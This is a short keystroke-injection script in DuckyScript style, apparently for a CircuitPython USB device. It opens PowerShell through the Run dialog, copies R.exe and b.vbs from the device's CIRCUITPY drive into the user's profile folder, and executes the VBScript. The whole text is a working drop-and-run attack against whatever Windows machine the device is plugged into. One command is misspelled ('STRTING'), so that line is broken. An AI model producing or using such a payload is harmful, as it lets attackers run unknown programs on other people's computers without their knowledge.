GUI r 
DELAY 1000
STRING powershell
STRTING cd $env:USERPROFILE; 
STRING  $u=$env:USERPROFILE;
STRING  $l=(Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter;
STRING  $r="${l}:\R.exe"; 
STRING  $v="${l}:\b.vbs"; 
STRING  cd "${l}:"; 
STRING  Copy $r $u;
STRING  Copy $v $u;
STRING  cd $u;
STRING  wscript b.vbs
ENTER
